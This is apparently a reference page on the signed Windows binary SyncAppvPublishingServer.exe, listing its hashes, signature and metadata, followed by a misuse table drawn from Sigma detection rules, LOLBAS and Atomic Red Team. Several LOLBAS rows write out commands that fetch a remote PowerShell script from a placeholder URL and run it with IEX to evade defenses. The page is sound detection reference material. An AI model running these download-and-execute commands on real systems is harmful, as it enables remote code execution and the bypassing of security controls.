---
title: SyncAppvPublishingServer.exe | Microsoft Application Virtualization Sync Utility
excerpt: What is SyncAppvPublishingServer.exe?
---

# SyncAppvPublishingServer.exe 

* File Path: `C:\Windows\system32\SyncAppvPublishingServer.exe`
* Description: Microsoft Application Virtualization Sync Utility

## Hashes

Type | Hash
-- | --
MD5 | `3C291419F60CDF9C2E4E19AD89944FA3`
SHA1 | `0B6D803C876B6313CE08A79B2A98F6E3BAC97689`
SHA256 | `53A78D6C3D05552E616897712D0D16BF14D0030AF2BB367841B6AECC883FF218`
SHA384 | `D7A55317A767950F5682573888B9156EFCB9F7BD73D44A61FAD253B6BBCB9785E56AE0F8B87009CEF5047091D6F61562`
SHA512 | `587B9BC171988CB41E3A0B19AB7A242DB23D070F70429F8061D095C1CB142498E8A6239004055C83439E6AD4EE52735F9BF97C3145622D0CF71021402005A4D2`
SSDEEP | `768:G6FyyphiE9jr4jwmp3PwysQdwRUuKs27cRg1Pb7aJGgZ:G6t9jrN8P3sQOUwSuYPSJGI`
IMP | `1EC41853BAB928648731DDAB143F3159`
PESHA1 | `EB4A6346C6342096471F65E6402E29B99ECEC8CF`
PE256 | `960CDC3E9C992799BF8FB7A29EB592C492079DA0F5CE562BA0261C509E4D1E08`

## Runtime Data

### Loaded Modules:

Path |
-- |
C:\Windows\System32\combase.dll |
C:\Windows\System32\GDI32.dll |
C:\Windows\System32\gdi32full.dll |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\System32\msvcp_win.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\ole32.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\System32\SHELL32.dll |
C:\Windows\system32\SyncAppvPublishingServer.exe |
C:\Windows\System32\ucrtbase.dll |
C:\Windows\System32\USER32.dll |
C:\Windows\System32\win32u.dll |


## Signature

* Status: Signature verified.
* Serial: `33000002EC6579AD1E670890130000000002EC`
* Thumbprint: `F7C2F2C96A328C13CDA8CDB57B715BDEA2CBD1D9`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: syncappvpublishingserver.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1320 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1320
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: Unknown

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\SyncAppvPublishingServer.exe](SyncAppvPublishingServer.exe-104C4F47F750B2C312EF9258C59A86E7.md) | 49
[C:\Windows\system32\SyncAppvPublishingServer.exe](SyncAppvPublishingServer.exe-273E3930B139A5ED04EBDE30DC972A8D.md) | 49

## Possible Misuse

*The following table contains possible examples of `SyncAppvPublishingServer.exe` being misused. While `SyncAppvPublishingServer.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml) | `- 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_exe.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml) | `Image\|endswith: '\SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_in_memory_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_in_memory_powershell.yml) | `- '\syncappvpublishingserver.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_contextinfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_module/powershell_syncappvpublishingserver_exe_in_contextinfo.yml) | `ContextInfo\|contains: 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `title: SyncAppvPublishingServer Execution to Bypass Powershell Restriction`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_script/powershell_syncappvpublishingserver_exe_in_scriptblocktext.yml) | `ScriptBlockText\|contains: 'SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `title: SyncAppvPublishingServer Execute Arbitrary PowerShell Code`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_execute_arbitrary_powershell.yml) | `Image\|endswith: '\SyncAppvPublishingServer.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_syncappvpublishingserver_vbs_execute_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml) | `- '\SyncAppvPublishingServer.vbs'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Name: SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `Name: Syncappvpublishingserver.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | - [Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution](#atomic-test-1---syncappvpublishingserver-signed-script-powershell-command-execution) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | ## Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | - [Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code](#atomic-test-2---syncappvpublishingserver---execute-arbitrary-powershell-code) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | ## Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | SyncAppvPublishingServer.exe "n; #{powershell_code}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


